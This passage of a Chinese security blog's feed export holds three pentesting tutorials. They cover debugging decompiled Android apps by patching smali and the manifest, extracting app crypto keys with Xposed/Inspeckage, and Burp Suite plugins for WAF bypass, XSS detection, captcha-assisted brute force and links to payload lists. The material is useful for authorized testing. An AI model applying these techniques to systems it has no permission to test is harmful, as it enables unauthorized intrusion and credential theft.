class=&quot;attribute&quot;&gt;jdk13&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;export JAVA_HOME=$JAVA_13_HOME&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#保存退出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#激活环境变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ source ~/.bash_profile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>app测试之动态调试</title>
    <link href="https://choge.top/2020/09/29/app%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>https://choge.top/2020/09/29/app测试之动态调试/</id>
    <published>2020-09-29T06:59:32.000Z</published>
    <updated>2020-10-27T02:30:24.507Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍IDEA，JEB，Eclipse进行app动态调试</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>安装apktool，如果apktool要使用-d参数将app反编译为java代码，则要使用apktool_2.0.3及之前版本</p><p>反编译apk<code>java -jar apktool.jar d xxx.apk</code></p><p>IDEA安装Smali插件</p><p><a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="noopener">https://bitbucket.org/JesusFreke/smali/downloads/</a></p><a id="more"></a><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20200929151519251.png" alt="image-20200929151519251"></p><p>重启</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20200929151621532.png" alt="image-20200929151621532"></p><p>这里有个天坑，安装完Smali插件后需要做一些配置，不然还是无法调试，配置如下两图</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201005132619027.png" alt="image-20201005132619027"></p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201005132850789.png" alt="image-20201005132850789"></p><p>反编译apk</p><p><code>java -jar apktool.jar d xxx.apk</code></p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007163417440.png" alt></p><p>反编译后AndroidManifest.xml中修改<code>debuggable=&quot;true&quot;</code></p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007163714272.png" alt="image-20201007163714272"></p><p>在入口处添加waitForDebugger代码进行调试等待</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007163913213.png" alt="image-20201007163913213"></p><p>找到入口Activity之后，我们直接在他的onCreate方法的第一行加上waitForDebugger代码即可，找到对应的MainActivity的smali源码：</p><p>然后添加一行代码：<code>invoke-static {}, Landroid/os/Debug;-&gt;waitForDebugger()V</code>，这个是smali语法的，其实对应的Java代码就是：<code>android.os.Debug.waitForDebugger()</code></p><p>启动app进入等待调试</p><p><code>adb shell am start -D -n 包名/入口名</code>如果.MainActivity前面的是包名，此处可以把钱吗的包名称省略，当然此处也可以省略前面的包名，直接一个.MainActivity</p><p>adb shell am start -D -n hfdcxy.com.myapplication/hfdcxy.com.myapplication.MainActivity</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007164204736.png" alt="image-20201007164204736"></p><h3 id="JEB动态调试"><a href="#JEB动态调试" class="headerlink" title="JEB动态调试"></a>JEB动态调试</h3><p>jeb下载与使用参考以下链接</p><p><a href="https://blog.csdn.net/JEROME__S/article/details/105458589" target="_blank" rel="noopener">https://blog.csdn.net/JEROME__S/article/details/105458589</a></p><p><a href="https://blog.csdn.net/ASSYIRAN/article/details/80534112" target="_blank" rel="noopener">https://blog.csdn.net/ASSYIRAN/article/details/80534112</a></p><p>直接将app拖入到jeb后选择需要的地方ctrl+b打断点</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007190242458.png" alt="image-20201007190242458"></p><p>手机选择app进入调试等待或者输入以下命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n hfdcxy<span class="selector-class">.com</span><span class="selector-class">.myapplication</span>/hfdcxy<span class="selector-class">.com</span><span class="selector-class">.myapplication</span><span class="selector-class">.MainActivity</span></span><br></pre></td></tr></table></figure><p>点击虫子图标选择要调试的应用进行调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007191218025.png" alt="image-20201007191218025"></p><p>app上输入数据后可以在jeb上看到输入的数据进行调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007190919303.png" alt="image-20201007190919303"></p><h3 id="IDEA动态调试"><a href="#IDEA动态调试" class="headerlink" title="IDEA动态调试"></a>IDEA动态调试</h3><h5 id="IDEA动态调试Java代码"><a href="#IDEA动态调试Java代码" class="headerlink" title="IDEA动态调试Java代码"></a>IDEA动态调试Java代码</h5><p>反编译时将Smali转换成Java代码加<code>-d</code>参数可以反编译为java代码，但是apktool需要选择</p><p>反编译apk<code>java -jar apktool.jar d -d xxx.apk</code></p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007213733932.png" alt="image-20201007213733932"></p><p>打开ddms，注意新款Android studio的ddms需要用老版本的Java才能打开，使用jdk-8u144，打开ddms路径在/Users/用户名/Library/Android/sdk下启动终端<code>sudo ./monitor</code>打开</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201008194759076.png" alt="image-20201008194759076"></p><p>新建一个java项目</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009110348936.png" alt="image-20201009110348936"></p><p>新建一个Java项目，把反编译出来的把Smali文件夹中的Java代码文件复制到新建java项目中的src文件夹中去</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009111000799.png" alt="image-20201009111000799"></p><p>进入如下功能点，填入对应端口号</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009111724308.png" alt="image-20201009111724308"></p><p>点击下图位置，可进行调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009112023359.png" alt="image-20201009112023359"></p><p>此时查看ddms，小虫子变绿，调试已通</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009112044152.png" alt="image-20201009112044152"></p><p>下断点后进行调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009112132446.png" alt="image-20201009112132446"></p><p>手机app输入数据后可在IDEA进行展示</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009112227020.png" alt="image-20201009112227020"></p><h5 id="IDEA动态调试Smali"><a href="#IDEA动态调试Smali" class="headerlink" title="IDEA动态调试Smali"></a>IDEA动态调试Smali</h5><p>将app反编译的文件夹导入到IDEA作为一个项目</p><p>当环境正确，手机正确连接IDEA时，IDEA会显示手机型号</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113551522.png" alt="image-20201009113551522"></p><p>app进入调试等待模式，点击IDEA如下图位置，会显示等待调试的应用，这样说明手机正确连接，app可以进行调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113656312.png" alt="image-20201009113656312"></p><p>点击如下进行配置</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113823017.png" alt="image-20201009113823017"></p><p>配置如下左侧新建一个Remote，端口可以先随便填写，手机与IDEA正确连接后再开启ddms会有冲突，所以此处可能不知道调试端口号，就可以随便填写</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009114034258.png" alt="image-20201009114034258"></p><p>smali代码下断点</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009142739723.png" alt="image-20201009142739723"></p><p>手机打开动态调试应用等待调试，按下图位置进行调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009142803266.png" alt="image-20201009142803266"></p><p>发现无法连接端口号，无法调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009142931173.png" alt="image-20201009142931173"></p><p>此点击右侧小虫子加箭头图标，选中调试应用进行调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143002217.png" alt="image-20201009143002217"></p><p>调试连接成功，端口号为8600</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143137806.png" alt="image-20201009143137806"></p><p>手机输入数据，IDEA可以正确调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143040470.png" alt="image-20201009143040470"></p><p>此时可以修改端口号</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143206168.png" alt="image-20201009143206168"></p><p>再点击小虫子图标，也可以正确调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143257984.png" alt="image-20201009143257984"></p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>网上有些文章会多一些配置，如下，作为参考，实际测试中图一会自动配置，图二操作可以不进行</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113953313.png" alt="image-20201009113953313"></p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113746367.png" alt="image-20201009113746367"></p><h3 id="Eclipse动态调试java（不推荐）"><a href="#Eclipse动态调试java（不推荐）" class="headerlink" title="Eclipse动态调试java（不推荐）"></a>Eclipse动态调试java（不推荐）</h3><p>反编译时将Smali转换成Java代码加<code>-d</code>参数可以反编译为java代码，但是apktool需要选择</p><p>反编译apk<code>java -jar apktool.jar d -d xxx.apk -o out</code></p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007213733932.png" alt="image-20201007213733932"></p><p>创建一个新的Java项目，Location使用反编译的out目录</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104015084.png" alt="image-20201009104015084"></p><p>打开ddms，/Users/用户名/Library/Android/sdk下启动终端<code>sudo ./monitor</code>打开，同时使应用等待调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104245721.png" alt="image-20201009104245721"></p><p>进行配置</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104306243.png" alt="image-20201009104306243"></p><p>新建一个Remote Java Application，端口选择ddms中显示的8600，然后点击Debug</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104410238.png" alt="image-20201009104410238"></p><p>此时小虫子变绿，说明调试成功</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104643668.png" alt="image-20201009104643668"></p><p>下合适的断点</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104716033.png" alt="image-20201009104716033"></p><p>调出Debug模式</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009105023750.png" alt="image-20201009105023750"></p><p>点击右侧小虫子，手机上输入数据，eclipse可获取变量值进行调试</p><p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009105213900.png" alt="image-20201009105213900"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/binbin594738977/article/details/106571844/" target="_blank" rel="noopener">新版IDEA或者AndroidStudio不能调试smali工程的问题</a></p><p><a href="https://blog.csdn.net/binbin594738977/article/details/106571844/" target="_blank" rel="noopener">https://blog.csdn.net/binbin594738977/article/details/106571844/</a></p><p>IDEA调试java</p><p><a href="https://www.cnblogs.com/axiong/p/5939762.html" target="_blank" rel="noopener">https://www.cnblogs.com/axiong/p/5939762.html</a></p><p>动态调试条件</p><p><a href="https://blog.csdn.net/qq_38851536/article/details/100026480" target="_blank" rel="noopener">https://blog.csdn.net/qq_38851536/article/details/100026480</a></p><p>加等待代码</p><p><a href="https://blog.csdn.net/zhangmiaoping23/article/details/51824728" target="_blank" rel="noopener">https://blog.csdn.net/zhangmiaoping23/article/details/51824728</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍IDEA，JEB，Eclipse进行app动态调试&lt;/p&gt;&lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h3&gt;&lt;p&gt;安装apktool，如果apktool要使用-d参数将app反编译为java代码，则要使用apktool_2.0.3及之前版本&lt;/p&gt;&lt;p&gt;反编译apk&lt;code&gt;java -jar apktool.jar d xxx.apk&lt;/code&gt;&lt;/p&gt;&lt;p&gt;IDEA安装Smali插件&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://bitbucket.org/JesusFreke/smali/downloads/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bitbucket.org/JesusFreke/smali/downloads/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="app" scheme="https://choge.top/tags/app/"/>
    
  </entry>
  
  <entry>
    <title>app测试之通过Xposed抓取秘钥</title>
    <link href="https://choge.top/2020/09/27/app%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%80%9A%E8%BF%87Xposed%E6%8A%93%E5%8F%96%E7%A7%98%E9%92%A5/"/>
    <id>https://choge.top/2020/09/27/app测试之通过Xposed抓取秘钥/</id>
    <published>2020-09-27T06:29:40.000Z</published>
    <updated>2020-10-27T02:30:00.364Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要讲解Inspeckage的基本使用</p><p>安装Xposed等参考本博刷机篇，由于为mac机器，如果要使用mumu模拟器，先要关闭22471端口防止出错，22471是mumu给出的Mac 端口号，关闭命令<code>sudo lsof -i:22471</code></p><h4 id="连接mumu模拟器"><a href="#连接mumu模拟器" class="headerlink" title="连接mumu模拟器"></a>连接mumu模拟器</h4><p><code>sudo adb connect localhost:22471</code></p><a id="more"></a><p>如果设备提示offline，执行以下命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb <span class="keyword">kill</span>-<span class="keyword">server</span></span><br><span class="line">adb <span class="keyword">start</span>-<span class="keyword">server</span></span><br><span class="line">adb devices</span><br></pre></td></tr></table></figure><h4 id="连接Inspeckage"><a href="#连接Inspeckage" class="headerlink" title="连接Inspeckage"></a>连接Inspeckage</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">adb</span> <span class="selector-tag">-s</span> <span class="selector-tag">forward</span> <span class="selector-tag">tcp</span><span class="selector-pseudo">:8008</span> <span class="selector-tag">tcp</span><span class="selector-pseudo">:8008</span> (-s为指定设备，可以先使用 adb devices 查看设备 )</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2020/09/27/app测试之通过Xposed抓取秘钥/image-20200927144525169.png" alt="image-20200927144525169"></p><p>选择app</p><p><img src="//choge.top/2020/09/27/app测试之通过Xposed抓取秘钥/image-20200927144620887.png" alt="image-20200927144620887"></p><p>打开网页 127.0.0.1:8008，查看密钥</p><p><img src="//choge.top/2020/09/27/app测试之通过Xposed抓取秘钥/image-20200927144656347.png" alt="image-20200927144656347"></p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>使用真机不需要做转发，手机和电脑连接同一wifi，浏览器输入软件展示的ip地址</p><h4 id="Inspeckage命令"><a href="#Inspeckage命令" class="headerlink" title="Inspeckage命令"></a>Inspeckage命令</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Logcat                               查看该app的logcat输出</span><br><span class="line">Tree View                         浏览app的数据目录并直接下载文件到本地</span><br><span class="line">Package Information     应用基本信息（组件信息、权限信息、共享库信息）</span><br><span class="line">Shared Preferences       LOG：app XML文件读写记录；Files：具体XML写入内容</span><br><span class="line">Serialization                      反序列化记录</span><br><span class="line">Crypto                               常见加解密记录（KEY、IV值）</span><br><span class="line">Hash                                 常见的哈希算法记录</span><br><span class="line">SQLite                               SQLite数据库操作记录</span><br><span class="line">HTTP                                 HTTP网络请求记录</span><br><span class="line">File<span class="built_in"> System </span>                      文件读写记录</span><br><span class="line">Misc.                                  调用Clipboard,URL.Parse()记录</span><br><span class="line">WebView                          调用webview内容                  </span><br><span class="line">IPC                                     进程之间通信记录</span><br><span class="line">+Hooks                             运行过程中用户自定义Hook记录</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要讲解Inspeckage的基本使用&lt;/p&gt;&lt;p&gt;安装Xposed等参考本博刷机篇，由于为mac机器，如果要使用mumu模拟器，先要关闭22471端口防止出错，22471是mumu给出的Mac 端口号，关闭命令&lt;code&gt;sudo lsof -i:22471&lt;/code&gt;&lt;/p&gt;&lt;h4 id=&quot;连接mumu模拟器&quot;&gt;&lt;a href=&quot;#连接mumu模拟器&quot; class=&quot;headerlink&quot; title=&quot;连接mumu模拟器&quot;&gt;&lt;/a&gt;连接mumu模拟器&lt;/h4&gt;&lt;p&gt;&lt;code&gt;sudo adb connect localhost:22471&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="app" scheme="https://choge.top/tags/app/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite常用插件使用</title>
    <link href="https://choge.top/2020/09/04/BurpSuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E4%BD%BF%E7%94%A8/"/>
    <id>https://choge.top/2020/09/04/BurpSuite常用插件使用/</id>
    <published>2020-09-04T09:18:40.000Z</published>
    <updated>2021-01-04T06:35:06.221Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要收集和使用Burpsuite常用插件及使用方法</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>安装phantomjs</p><p><a href="https://phantomjs.org/download.html" target="_blank" rel="noopener">https://phantomjs.org/download.html</a></p><p>安装jython</p><p><a href="https://www.jython.org/download" target="_blank" rel="noopener">https://www.jython.org/download</a></p><p>安装jruby</p><p><a href="https://www.jruby.org/download" target="_blank" rel="noopener">https://www.jruby.org/download</a></p><a id="more"></a><h3 id="Burpsuite插件"><a href="#Burpsuite插件" class="headerlink" title="Burpsuite插件"></a>Burpsuite插件</h3><h4 id="sqlmap4burp"><a href="#sqlmap4burp" class="headerlink" title="sqlmap4burp++"></a>sqlmap4burp++</h4><p>项目地址：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">https://github.com/c0ny1/sqlmap4burp-plus-plus</a></p><p>配置好sqlmap路径，Sqlmap option为要实现的命令</p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200916195735371.png" alt="image-20200916195735371"></p><h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>主要是用来绕过waf</p><p>项目地址：<a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">https://github.com/c0ny1/chunked-coding-converter</a></p><p>使用如下</p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200918154848871.png" alt="image-20200918154848871"></p><h4 id="gzip解码"><a href="#gzip解码" class="headerlink" title="gzip解码"></a>gzip解码</h4><p>部分数据为gizp的是时候使用插件能自动解码，但有时候并不会解码</p><p>项目地址：<a href="https://github.com/portswigger/decompressor" target="_blank" rel="noopener">https://github.com/portswigger/decompressor</a>  </p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200920130827186.png" alt="image-20200920130827186"></p><h4 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h4><p>Hackbar无需多说</p><p>项目地址：<a href="https://github.com/d3vilbug/HackBar" target="_blank" rel="noopener">https://github.com/d3vilbug/HackBar</a></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200921105455894.png" alt="image-20200921105455894"></p><p>但有Knife v1.6版本中的Hackbar会有更多功能</p><p>项目地址：<a href="https://github.com/bit4woo/knife" target="_blank" rel="noopener">https://github.com/bit4woo/knife</a></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20201026140320931.png" alt="image-20201026140320931"></p><h4 id="BurpJSLinkFinder"><a href="#BurpJSLinkFinder" class="headerlink" title="BurpJSLinkFinder"></a>BurpJSLinkFinder</h4><p>自动查找js中的连接</p><p>项目地址：<a href="https://github.com/InitRoot/BurpJSLinkFinder.git" target="_blank" rel="noopener">https://github.com/InitRoot/BurpJSLinkFinder.git</a></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200920151402446.png" alt="image-20200920151402446"></p><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p><a href="https://github.com/federicodotta/Java-Deserialization-Scanner" target="_blank" rel="noopener">https://github.com/federicodotta/Java-Deserialization-Scanner</a></p><p>使用教程如下</p><p><a href="https://www.cnblogs.com/yh-ma/p/10299289.html" target="_blank" rel="noopener">https://www.cnblogs.com/yh-ma/p/10299289.html</a></p><h4 id="Brida"><a href="#Brida" class="headerlink" title="Brida"></a>Brida</h4><p><a href="https://blog.csdn.net/weixin_39190897/article/details/102691898" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39190897/article/details/102691898</a></p><p>####Software Vulnerability Scanner</p><p>漏洞通过Vulnerability展示扫描结果</p><p>项目地址：<a href="https://github.com/portswigger/software-vulnerability-scanner" target="_blank" rel="noopener">https://github.com/portswigger/software-vulnerability-scanner</a>  </p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200920154707104.png" alt="image-20200920154707104"></p><h4 id="app自动解密"><a href="#app自动解密" class="headerlink" title="app自动解密"></a>app自动解密</h4><p><a href="https://github.com/lyxhh/lxhToolHTTPDecrypt" target="_blank" rel="noopener">https://github.com/lyxhh/lxhToolHTTPDecrypt</a></p><h4 id="xss探测"><a href="#xss探测" class="headerlink" title="xss探测"></a>xss探测</h4><p>项目地址：<a href="https://github.com/nVisium/xssValidator" target="_blank" rel="noopener">https://github.com/nVisium/xssValidator</a></p><p>使用方法</p><p>在 Terminal 中先切换到 /usr/bin/ 目录，输入：<code>cd  /usr/bin/</code>，再执行 <code>open ~/.bash_profile</code>，在 .bash_profile 中添加以下的内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"<span class="variable">$PATH</span>:/Users/xxx/phantomjs-2.1.1-macosx/bin:<span class="variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure><p><code>source ~/.bash_profile</code>保存配置</p><p>xss.js下载下来后放到</p><p><code>phantomjs xss.js</code>启动xss.js</p><p>进行如下测试</p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922194900329.png" alt="image-20200922194900329"></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922194951546.png" alt="image-20200922194951546"></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922195223304.png" alt="image-20200922195223304"></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922195327478.png" alt="image-20200922195327478"></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922195433631.png" alt="image-20200922195433631"></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922195552728.png" alt="image-20200922195552728"></p><h5 id="xss-payload收集"><a href="#xss-payload收集" class="headerlink" title="xss payload收集"></a>xss payload收集</h5><p><a href="https://github.com/pgaijin66/XSS-Payloads" target="_blank" rel="noopener">https://github.com/pgaijin66/XSS-Payloads</a></p><p><a href="https://github.com/RenwaX23/XSS-Payloads" target="_blank" rel="noopener">https://github.com/RenwaX23/XSS-Payloads</a></p><p><a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">https://github.com/foospidy/payloads</a></p><h4 id="bypass-waf"><a href="#bypass-waf" class="headerlink" title="bypass-waf"></a>bypass-waf</h4><p>项目地址： <a href="https://github.com/portswigger/bypass-waf" target="_blank" rel="noopener">https://github.com/portswigger/bypass-waf</a>  </p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922223337255.png" alt="image-20200922223337255"></p><h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h4><p>项目地址：<a href="https://github.com/bit4woo/domain_hunter.git" target="_blank" rel="noopener">https://github.com/bit4woo/domain_hunter.git</a></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200923102146370.png" alt="image-20200923102146370"></p><h4 id="logger-plus-plus"><a href="#logger-plus-plus" class="headerlink" title="logger-plus-plus"></a>logger-plus-plus</h4><p>Logger++ 可以查看所有工具发出的请求，如 repeater, intruder, scanner, 插件等。这样我们可以查看到扫描时的一些 payload，以及在扫描时监控网站后台的响应情况。</p><p>项目地址：<a href="https://github.com/portswigger/logger-plus-plus" target="_blank" rel="noopener">https://github.com/portswigger/logger-plus-plus</a>  </p><h4 id="Wsdler"><a href="#Wsdler" class="headerlink" title="Wsdler"></a>Wsdler</h4><p>Wsdler 可以解析 WSDL 请求，以便使用 repeater 和 scanner 对 WSDL 请求进行测试。可以直接在Bapp Store 安装。</p><h4 id="前端加解密"><a href="#前端加解密" class="headerlink" title="前端加解密"></a>前端加解密</h4><p>项目地址：<a href="https://github.com/c0ny1/jsEncrypter" target="_blank" rel="noopener">https://github.com/c0ny1/jsEncrypter</a></p><p>下载模板，引入前段加密文件，编写调用加密函数的代码</p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204147285.png" alt="image-20200924204147285"></p><p>启动phantomjs</p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204228521.png" alt="image-20200924204228521"></p><p>测试连接成功</p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204314340.png" alt="image-20200924204314340"></p><p>具体和测试配置如下</p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204409412.png" alt="image-20200924204409412"></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204642527.png" alt="image-20200924204642527"></p><p>爆破成功</p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204752010.png" alt="image-20200924204752010"></p><p>回到phantomjs查找出实际对应密码</p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204838566.png" alt="image-20200924204838566"></p><h4 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h4><p>进行爆破时可识别验证码，具体使用方法查看项目地址</p><p>项目地址：<a href="https://github.com/c0ny1/captcha-killer" target="_blank" rel="noopener">https://github.com/c0ny1/captcha-killer</a></p><p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924205154924.png" alt="image-20200924205154924"></p><h4 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h4><h4 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h4><h3 id="项目收集汇总"><a href="#项目收集汇总" class="headerlink" title="项目收集汇总"></a>项目收集汇总</h3><p><a href="https://github.com/xl7dev/BurpSuite/tree/master/Extender" target="_blank" rel="noopener">https://github.com/xl7dev/BurpSuite/tree/master/Extender</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.secpulse.com/archives/124527.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/124527.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要收集和使用Burpsuite常用插件及使用方法&lt;/p&gt;&lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h3&gt;&lt;p&gt;安装phantomjs&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://phantomjs.org/download.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://phantomjs.org/download.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安装jython&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.jython.org/download&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jython.org/download&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安装jruby&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.jruby.org/download&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jruby.org/download&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="burp suite" scheme="https://choge.top/tags/burp-suite/"/>
    
  </entry>
  
  <entry>
    <title>渗透之优化Chrome、Firefox浏览器</title>
    <link href="https://choge.top/2020/09/02/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BC%98%E5%8C%96Chrome%E3%80%81Firefox%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    <id>https://choge.top/2020/09/02/渗透之优化Chrome、Firefox浏览器/</id>
    <published>2020-09-02T02:24:44.000Z</published>
    <updated>2020-10-27T06:37:11.397Z</updated>
    
